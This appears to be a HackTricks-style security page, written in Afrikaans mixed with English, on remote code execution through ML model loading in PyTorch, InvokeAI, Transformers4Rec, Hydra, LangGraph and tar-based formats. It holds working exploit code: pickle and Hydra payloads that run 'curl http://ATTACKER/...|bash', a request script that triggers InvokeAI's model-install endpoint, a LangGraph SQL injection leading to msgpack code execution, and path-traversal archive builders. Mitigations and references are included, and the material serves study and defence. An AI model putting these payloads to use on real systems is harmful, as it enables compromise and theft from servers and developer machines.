# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laai na RCE

Machine Learning-modelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Hierdie modelle kan in ontwikkelaars se masjiene of produksiesisteme gelaai word om dit te gebruik. Modelle behoort gewoonlik nie malicious code te bevat nie, maar daar is gevalle waar die model gebruik kan word om arbitrary code op die stelsel uit te voer, hetsy as 'n beoogde funksie of weens 'n vulnerability in die model-loading library.

Ten tyde van die skryf hiervan is die volgende voorbeelde van hierdie tipe vulnerabilities:

| **Framework / Tool**        | **Vulnerability (CVE indien beskikbaar)**                                                    | **RCE Vector**                                                                                                                           | **Verwysings**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint lei tot code execution (omseil die `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download veroorsaak code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint aktiveer pickle reducer tydens `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key inject SQL/JSON-path-sintaksis, `UNION SELECT` skep 'n fake checkpoint row, waarna `msgpack` deserialization attacker-chosen Python code importeer en oproep | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Die laai van 'n model vanaf YAML gebruik `yaml.unsafe_load` (code exec) <br> Die laai van 'n model met 'n **Lambda**-layer voer arbitrary Python code uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite`-model aktiveer integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Die laai van 'n model via `joblib.load` voer pickle uit met die aanvaller se `__reduce__`-payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` se verstekinstelling het pickled object arrays toegelaat – malicious `.npy/.npz` aktiveer code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX-model se external-weights path kan uit die directory ontsnap (lees arbitrary files) <br> Malicious ONNX-model-tar kan arbitrary files oorskryf (wat tot RCE lei) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | 'n Model met 'n custom operator vereis dat attacker se native code gelaai word; komplekse model graphs misbruik logic om unintended computations uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Die gebruik van die model-load API met `--model-control` enabled laat relative path traversal toe om files te skryf (bv. om `.bashrc` vir RCE te oorskryf)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF-model-lêer veroorsaak heap buffer overflows in die parser, wat arbitrary code execution op die victim system moontlik maak                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`)-model met 'n Lambda-layer se code word steeds tydens load uitgevoer (Keras `safe_mode` dek nie die old format nie – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Baie ML-tools (bv. pickle-based model formats, Python `pickle.load`) sal arbitrary code uitvoer wat in model files ingebed is, tensy dit gemitigeer word | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config stel `_target_` op 'n arbitrary callable (bv. `builtins.exec`) → word tydens load uitgevoer, selfs met “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Daar is ook sommige Python-pickle-gebaseerde modelle, soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word, wat gebruik kan word om arbitrary code op die stelsel uit te voer indien hulle nie met `weights_only=True` gelaai word nie. Enige pickle-gebaseerde model kan dus besonder susceptible wees vir hierdie tipe attacks, selfs al word dit nie in die tabel hierbo gelys nie.

### Hydra metadata → RCE (werk selfs met safetensors)

`hydra.utils.instantiate()` importeer en roep enige dotted `_target_` in 'n configuration/metadata-object op. Wanneer libraries **untrusted model metadata** aan `instantiate()` deurgee, kan 'n aanvaller 'n callable en arguments verskaf wat onmiddellik tydens model load uitgevoer word (geen pickle benodig nie).<sup>[[12]](#references)</sup>

Payload example (werk in `.nemo` `model_config.yaml`, repo `config.json`, of `__metadata__` binne `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Sleutelpunte:
- Geaktiveer voordat modelinitialisering in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders en FlexTok loaders plaasvind.
- Hydra se string block-list kan omseil word via alternatiewe import paths (bv. `enum.bltns.eval`) of name wat deur die toepassing opgelos word (bv. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok ontleed ook stringified metadata met `ast.literal_eval`, wat DoS (CPU/geheue-uitputting) voor die Hydra-aanroep moontlik maak.

### 🆕  InvokeAI RCE deur `torch.load` (CVE-2024-12029)

`InvokeAI` is ’n gewilde open-source webinterface vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST endpoint `/api/v2/models/install` bloot, wat gebruikers toelaat om modelle vanaf arbitrêre URL's af te laai en te laai.<sup>[[1]](#references)</sup>

Intern roep die endpoint uiteindelik:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wanneer die verskafde lêer ’n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` **pickle-deserialisering** uit. Omdat die inhoud direk vanaf die gebruiker-beheerde URL kom, kan ’n aanvaller ’n kwaadwillige objek met ’n pasgemaakte `__reduce__`-metode binne die checkpoint insluit; die metode word **tydens deserialisering** uitgevoer, wat tot **remote code execution (RCE)** op die InvokeAI-bediener lei.

Die kwesbaarheid is toegeken **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Stapsgewyse Exploitation

1. Skep ’n kwaadwillige checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` op ’n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Aktiveer die kwesbare endpoint (geen verifikasie nodig nie):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system`-gadget loop en die aanvaller verkry code execution in die konteks van die InvokeAI-proses.

Klaargemaakte exploit: **Metasploit**-module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele proses.<sup>[[3]](#references)</sup>

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (scan-vlag verstek **false**)
•  `/api/v2/models/install` is bereikbaar deur die aanvaller
•  Proses het toestemmings om shell commands uit te voer

#### Versagtingsmaatreëls

* Gradeer op na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` by verstek en voer malware-skandering uit voor deserialisering.
* Wanneer checkpoints programmaties gelaai word, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-helper.
* Dwing allow-lists / signatures af vir modelbronne en laat die diens met least-privilege loop.

> ⚠️ Onthou dat **enige** Python pickle-gebaseerde formaat (insluitend baie `.pt`, `.pkl`, `.ckpt`, `.pth`-lêers) inherent onveilig is om vanaf onbetroubare bronne te deserialiseer.

---

Voorbeeld van ’n ad-hoc-versagtingsmaatreël indien jy ouer InvokeAI-weergawes agter ’n reverse proxy moet laat loop:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het ’n onveilige checkpoint loader blootgestel wat `torch.load()` direk op gebruiker-verskafde paaie geroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan ’n aanvaller-beheerde checkpoint arbitrêre kode via ’n reducer tydens deserialisering uitvoer.<sup>[[5]](#references)</sup>

Kwesbare pad (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python pickle kan ’n objek ’n reducer (`__reduce__`/`__setstate__`) definieer wat ’n callable en argumente terugstuur. Die callable word tydens unpickling uitgevoer. As so ’n objek in ’n checkpoint teenwoordig is, word dit uitgevoer voordat enige weights gebruik word.

Minimale kwaadwillige checkpoint-voorbeeld:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Afleweringsvektore en ontploffingsradius:
- Trojanized checkpoints/models wat via repos, buckets of artifact registries gedeel word
- Geoutomatiseerde resume/deploy-pipelines wat checkpoints outomaties laai
- Uitvoering vind binne training/inference-workers plaas, dikwels met verhoogde privileges (bv. root in containers)

Regstelling: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met ’n beperkte, allow-listed deserializer wat in `transformers4rec/utils/serialization.py` geïmplementeer is. Die nuwe loader valideer tipes/velde en voorkom dat arbitrêre callables tydens laai aangeroep word.<sup>[[7]](#references)</sup>

Defensiewe riglyne spesifiek vir PyTorch-checkpoints:
- Moenie onvertroude data unpickle nie. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- Indien jy PyTorch-serialisering moet gebruik, maak seker dat `weights_only=True` (ondersteun in nuwer PyTorch) gebruik word, of gebruik ’n custom allow-listed unpickler soortgelyk aan die Transformers4Rec-patch.
- Dwing modelherkoms/-handtekeninge af en sandbox deserialization (seccomp/AppArmor; non-root user; beperkte FS en geen network egress).
- Monitor vir onverwagte child processes vanaf ML-services tydens checkpoint-laai; trace `torch.load()`/`pickle`-gebruik.

POC en vulnerable/patch-verwysings:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Voorbeeld – crafting van ’n malicious PyTorch-model

- Skep die model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Laai die model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel 'n `resnet`-endpoint bloot wat data wat deur die gebruiker beheer word, deserialiseer. ZDI het bevestig dat 'n remote attacker 'n slagoffer kan dwing om 'n malicious page/file te laai, dit 'n crafted serialized blob na daardie endpoint te laat stuur, en deserialization as `root` te trigger, wat tot volledige kompromittering lei.

Die exploit flow weerspieël tipiese pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Enige gadget wat tydens deserialization bereikbaar is (konstruktors, `__setstate__`, framework-callbacks, ens.), kan op dieselfde manier gewapen word, ongeag of die transport HTTP, WebSocket of ’n lêer was wat in ’n gemonitorde gids geplaas is.



### LangGraph checkpointer SQLi → MessagePack RCE

Hierdie aanvalsketting is interessant omdat die aanvaller **nie ’n kwaadwillige model-lêer hoef op te laai nie**. In plaas daarvan stel die toepassing ’n **AI-agent-persistentheids-API** (`get_state_history(..., filter=...)`) bloot, en gebruikersinvoer bereik die checkpointer se query builder.

#### 1. Strukturele SQLi in metadata-filters

’n Kwesbare SQLite-patroon het soos volg gelyk:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Die waarde word later gebind, maar `query_key` word in die **JSON path string** saamgevoeg, dus breek ’n `'` binne die dictionary key uit `'$.\{query_key\}'` en inject dit SQL. Dieselfde les geld vir **JSON paths, identifiers, operators, `LIMIT` en TTL fields**: placeholders beskerm slegs waardes, nie strukturele query-sintaksis nie.

#### 2. `UNION SELECT` kan downstream sinks teiken, nie net datadiefstal nie

Die query gee `type` en geserialiseerde `checkpoint`-bytes terug, wat later as volg verbruik word:
```python
self.serde.loads_typed((type, checkpoint))
```
Dit beteken dat 'n SQLi in die `WHERE`-klousule 'n **vals resultaatry** kan inspuit:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
As kode later enige geselekteerde kolom ontleed, deserialiseer, skryf of uitvoer, koppel daardie kolomme aan hul sinks. In hierdie geval verander die vervalste ry SQLi in **deserialisering wat deur die aanvaller beheer word**.

#### 3. Onveilige MessagePack-uitbreidingshooks is gelykstaande aan kodegadgette

LangGraph se `msgpack`-pad het 'n pasgemaakte uitbreidingshook gebruik wat 'n geneste tuple uitgepak en die volgende uitgevoer het:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Dus 'n MessagePack extension object wat iets ekwivalent aan `("os", "system", "id > /tmp/pwned")` enkodeer, importeer `os`, resolveer `system`, en voer die command uit. Wanneer AI frameworks nagegaan word, inspekteer **custom MessagePack/JSON/pickle revivers** vir dynamic imports, reflection, of arbitrary callable dispatch.

#### 4. Praktiese ouditpatroon vir agent frameworks

Gaan enige user-controlled input na wat by die volgende uitkom:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders wat SQL- of Redis-query fragments genereer
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths wat rows vertrou wat deur die persistence layer teruggestuur word

Hierdie spesifieke chain het self-hosted LangGraph-deployments geraak wat **SQLite**- of **Redis**-checkpointers gebruik het wanneer untrusted users `filter` kon beheer. Patched versions wat in die disclosure genoem is, was `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, en `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modelle tot Path Traversal

Soos in [**hierdie blogplasing**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) opgemerk word, is die meeste model-formate wat deur verskillende AI frameworks gebruik word, op archives gebaseer, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om Path Traversal-aanvalle uit te voer, wat dit moontlik maak om arbitrary files te lees vanaf die stelsel waarop die model gelaai word.<sup>[[16]](#references)</sup>

Byvoorbeeld, met die volgende code kan jy 'n model skep wat 'n file in die `/tmp`-directory sal skep wanneer dit gelaai word:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Of, met die volgende kode kan jy 'n model skep wat 'n symlink na die `/tmp`-gids sal skep wanneer dit gelaai word:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Diepgaande bespreking: Keras .keras-deserialisering en gadget hunting

Vir 'n gefokusde gids oor .keras-internals, Lambda-layer RCE, die arbitrary import-kwessie in ≤ 3.8, en post-fix gadget discovery binne die allowlist, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Verwysings

- [1] [OffSec blog – "CVE-2024-12029 – Deserialisering van onbetroubare data in InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit-module-dokumentasie](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – sekuriteitsoorwegings vir torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Verkryging van Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Kwetsbare loader voor die patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kwaadwillige checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader ná die patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution met moderne AI/ML-formate en -libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate-dokumentasie](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (waarskuwing oor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Van SQLi na RCE: Exploiting LangGraph se Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pivoting Archive Slip Bugs into High-Value AI/ML Bounties](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
